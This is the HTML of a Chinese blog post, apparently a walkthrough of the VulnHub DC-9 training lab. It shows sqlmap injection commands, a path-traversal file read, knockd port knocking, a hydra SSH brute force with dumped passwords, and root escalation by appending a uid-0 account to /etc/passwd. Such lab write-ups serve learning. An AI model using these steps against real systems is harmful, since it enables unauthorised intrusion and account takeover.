@@ -1,0 +1,379 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>vulnhub靶场记录DC-9 | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub靶场DC-9靶场描述DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  The ultimate goal of this challenge is to get root and to re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶场记录DC-9">
+<meta property="og:url" content="http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/index.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="vulnhub靶场DC-9靶场描述DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.  The ultimate goal of this challenge is to get root and to re">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2024-04-13T13:40:27.748Z">
+<meta property="article:modified_time" content="2024-04-17T06:39:02.895Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub靶场记录DC-9',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-17 14:39:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub靶场记录DC-9</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-13T13:40:27.748Z" title="发表于 2024-04-13 21:40:27">2024-04-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-17T06:39:02.895Z" title="更新于 2024-04-17 14:39:02">2024-04-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub靶场记录DC-9"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub靶场DC-9"><a href="#vulnhub靶场DC-9" class="headerlink" title="vulnhub靶场DC-9"></a>vulnhub靶场DC-9</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
+
+The ultimate goal of this challenge is to get root and to read the one and only flag.
+
+Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
+
+For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.
+</code></pre>
+<p>这次靶场描述没有给到什么信息</p>
+<h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p>
+<pre><code>nmap 192.168.204.0/24
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132128103.png" alt="image-20240413212816063"></p>
+<p>靶场ip为<code>192.168.204.138</code></p>
+<p>再扫端口</p>
+<pre><code>nmap -A -p- -v 192.168.204.138
+</code></pre>
+<p>只开放了tcp服务 80端口 使用Apache中间件 版本2.4.38</p>
+<p>ssh服务此时显示的是filtered 被过滤了 这里是一个伏笔</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151949734.png" alt="image-20240415194924702"></p>
+<p>再来扫一下指纹信息</p>
+<pre><code>whatweb -v http://192.168.204.138/
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132133436.png" alt="image-20240413213315387"></p>
+<p>扫一下目录 </p>
+<pre><code>python3 dirsearch.py -u http://192.168.204.138/ -i 200
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132137726.png" alt="image-20240413213735695"></p>
+<h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151108793.png" alt="image-20240415110806734"></p>
+<p>发现两个可能存在问题的页面</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130487.png" alt="image-20240415113001414"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151130693.png" alt="image-20240415113006626"></p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>直接用xray扫一遍 </p>
+<pre><code>.\xray_windows_amd64.exe webscan --basic-crawler http://192.168.204.138/ --html-output out.html
+</code></pre>
+<p>查看out.html 看来是results.php页面存在sql注入</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151150014.png" alt="image-20240415115022932"></p>
+<p>直接上sqlmap</p>
+<pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; --dbs --level=5
+</code></pre>
+<p>要写<code>--date &quot;search=123456&quot;</code> 参数是因为我们在search.php页面搜索框输入内容之后 会直接跳转到results.php 使用POST方法传入一个<code>search</code>参数</p>
+<p>有三个数据库</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151509572.png" alt="image-20240415150917512"></p>
+<p>先爆users数据库的表</p>
+<pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users --tables --level=5 
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151510643.png" alt="image-20240415151047575"></p>
+<p>爆字段 </p>
+<pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails --columns --level=5 
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151511447.png" alt="image-20240415151157366"></p>
+<p>爆用户名和密码</p>
+<pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D users -T UserDetails -C &quot;password,username&quot; --dump --level=5
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151513568.png" alt="image-20240415151306497"></p>
+<p>得到了普通用户的用户名和密码</p>
+<p>接着来爆Staff数据库 </p>
+<pre><code>python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff --tables --level=5
+python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --columns --level=5 
+python3 sqlmap.py -u &#39;http://192.168.204.138/results.php&#39; --data &quot;search=123456&quot; -D Staff -T Users --dump --level=5
+</code></pre>
+<p>得到表中的admin用户密码是哈希值 但是sqlmap可以直接进行爆破 得到明文是<code>transorbital1</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151519482.png" alt="image-20240415151903397"></p>
+<h4 id="登陆网站"><a href="#登陆网站" class="headerlink" title="登陆网站"></a>登陆网站</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520596.png" alt="image-20240415152003554"></p>
+<p>使用上面爆破出来的密码成功登陆  但是看到下面的<code>File does not exist</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151520427.png" alt="image-20240415152026369"></p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>想到存在文件包含 </p>
+<pre><code>http://192.168.204.138/manage.php?file=../../../../etc/passwd
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151939819.png" alt="image-20240415193910763"></p>
+<p>成功执行 发现其中的很多用户都在我们上面爆出来的数据库中的普通用户中出现过 </p>
+<h3 id="三、ssh远程连接靶机"><a href="#三、ssh远程连接靶机" class="headerlink" title="三、ssh远程连接靶机"></a>三、ssh远程连接靶机</h3><h4 id="敲门服务"><a href="#敲门服务" class="headerlink" title="敲门服务"></a>敲门服务</h4><p>看到很多用户都在那我们应该尝试使用ssh进行连接靶机 但是之前我们在扫描端口的时候发现22端口开放的ssh服务显示的是被过滤的状态 搜一下这个情况</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1782065">通过Knockd隐藏SSH，让黑客看不见你的服务器</a></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152002647.png" alt="image-20240415200255585"></p>
+<p>看到是使用了knockd端口敲门服务 隐藏了ssh服务</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/16066178.html">knockd端口敲门服务</a></p>
+<pre><code>端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。
+</code></pre>
+<p>为了可以重新开启ssh服务 我们要查看敲门服务的配置文件<code>/etc/knockd.conf</code> </p>
+<pre><code>http://192.168.204.138/manage.php?file=../../../../etc/knockd.conf
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152006026.png" alt="image-20240415200604990"></p>
+<p>我们可以从配置文件中得到出来敲门暗号的顺序 </p>
+<pre><code>sequence = 7469,8475,9842  # 开启服务顺序
+sequence = 9842,8475,7469  # 关闭服务顺序
+</code></pre>
+<p>下面我们就利用敲门暗号来开启被过滤的ssh服务</p>
+<pre><code class="bash">apt install knockd  # 安装knockd
+systemctl start knockd # 启动knockd服务
+knock 192.168.204.138 7469 8475 9842  # 使用暗号进行敲门
+nmap -A -p- 192.168.204.138  # 扫描靶机端口
+</code></pre>
+<p>可以看到靶机的ssh服务成功被开启</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152021880.png" alt="image-20240415202126831"></p>
+<h4 id="hydra爆破用户密码"><a href="#hydra爆破用户密码" class="headerlink" title="hydra爆破用户密码"></a>hydra爆破用户密码</h4><p>将刚刚数据库中的用户名和密码单独放到两个字典文件中 <font color='red'> 这里要注意 用户名和密码字典中每行用户名和密码后面千万不能有空格 否则是爆不出来的 <del>问就是血的教训QAQ</del></font></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404152034860.png" alt="image-20240415203445829"></p>
+<p>使用hydra进行爆破</p>
+<pre><code class="bash">hydra -L username.txt -P passwd.txt ssh://192.168.204.138
+</code></pre>
+<p>爆破出三组用户 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162108924.png" alt="image-20240416210803862"></p>
+<pre><code>login: chandlerb   password: UrAG0D!
+login: joeyt   password: Passw0rd
+login: janitor   password: Ilovepeepee
+</code></pre>
+<p>用这三个用户都登陆一下靶机 发现登陆到janitor靶机的时候 在登陆后的默认文件夹中有个隐藏文件夹 另外两个用户里面没有</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162121760.png" alt="image-20240416212109728"></p>
+<p>进入文件夹 查看里面的文件<code>passwords-found-on-post-it-notes.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162122905.png" alt="image-20240416212217860"></p>
+<p>看起来还是密码 将这几个密码放入刚才的密码字典中 在爆破一下 发现又爆破出一个用户<code>fredf</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162125625.png" alt="image-20240416212534564"></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>用这个用户在ssh连接一下 执行<code>sudo -l</code>命令看一下可以使用的sudo权限命令 发现<code>/opt/devstuff/dist/test/test</code> 这个文件可以无密码以sudo权限执行</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162225736.png" alt="image-20240416222540670"></p>
+<p>我们进入文件夹 读取一下这个文件的内容 是一个linux中的可执行程序</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162231229.png" alt="image-20240416223137150"></p>
+<p>尝试运行 发现回显是</p>
+<p><img src="E:/Desktop/%E6%88%98%E9%98%9F%E5%91%A8%E6%8A%A5/202404162236599.png" alt="image-20240416223630531"></p>
+<p>告诉了我们test.py的使用方法  那我们来找一下这个文件</p>
+<pre><code>find / -name &quot;test.py&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162242150.png" alt="image-20240416224204963"></p>
+<p>进行读取</p>
+<pre><code class="python">#!/usr/bin/python
+
+import sys
+
+if len (sys.argv) != 3 :
+    print (&quot;Usage: python test.py read append&quot;)
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], &quot;r&quot;)
+    output = (f.read())
+
+    f = open(sys.argv[2], &quot;a&quot;)
+    f.write(output)
+    f.close()
+</code></pre>
+<p>这段代码的意思就是读取参数1中的内容 将这个内容追加到参数2中 同时 运行时的参数不是3的话 就会报错</p>
+<p>那我们就可以在创建一组用户名和密码 将这个内容写入&#x2F;etc&#x2F;passwd文件中 在切换用户 就可以获得root权限</p>
+<p>先用openssl生成一个加盐的密码</p>
+<pre><code>openssl passwd -1 -salt admin admin
+
+# $1$admin$1kgWpnZpUx.vTroWPXPIB0
+</code></pre>
+<p>利用test可执行程序将这个新用户添加到<code>/etc/passwd</code></p>
+<pre><code>echo &#39;admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash&#39; &gt; /tmp/passwd
+
+sudo /opt/devstuff/dist/test/test  /tmp/passwd /etc/passwd
+</code></pre>
+<p>在切换用户 已经是roo权限</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162313083.png" alt="image-20240416231342990"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404162314972.png" alt="image-20240416231419833"></p>
+<pre><code>
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+                                                                             
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+</code></pre>
+<p>至此 我们拿到了flag  DC系列靶机也告一段落 </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.xray扫到sql注入漏洞</p>
+<p>2.sqlmap进行自动化注入 找到网站登陆账密 和普通用户账密</p>
+<p>3.使用普通用户账密 hydra爆破靶机登陆账密 </p>
+<p>4.敲门服务 连接ssh</p>
+<p>4.找到隐藏文件 切换用户</p>
+<p>5.可执行程序 添加root用户提权</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/">http://w3nx1z1.github.io/2024/04/13/vulnhub靶场DC-9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/04/13/2023FIC/" title="2023FIC(除了两个程序分析)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023FIC(除了两个程序分析)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/" title="vulnhub靶场记录DC-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-30</div><div class="title">vulnhub靶场记录DC-3</div></div></a></div><div><a href="/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub靶场记录DC-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-04</div><div class="title">vulnhub靶场记录DC-4</div></div></a></div><div><a href="/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub靶场记录DC-5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-05</div><div class="title">vulnhub靶场记录DC-5</div></div></a></div><div><a href="/2024/03/31/vulnhub%E9%9D%B6%E5%9C%BADC-7wp/" title="vulnhub靶场记录DC-7"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-31</div><div class="title">vulnhub靶场记录DC-7</div></div></a></div><div><a href="/2024/04/03/vulnhub%E9%9D%B6%E5%9C%BADC-8/" title="vulnhub靶场记录DC-8"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-03</div><div class="title">vulnhub靶场记录DC-8</div></div></a></div><div><a href="/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/" title="vulnhub靶场记录DC-2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-21</div><div class="title">vulnhub靶场记录DC-2</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E5%9C%BADC-9"><span class="toc-text">vulnhub靶场DC-9</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-text">靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA"><span class="toc-text">渗透靶场</span></a><ol class="toc-child"><li 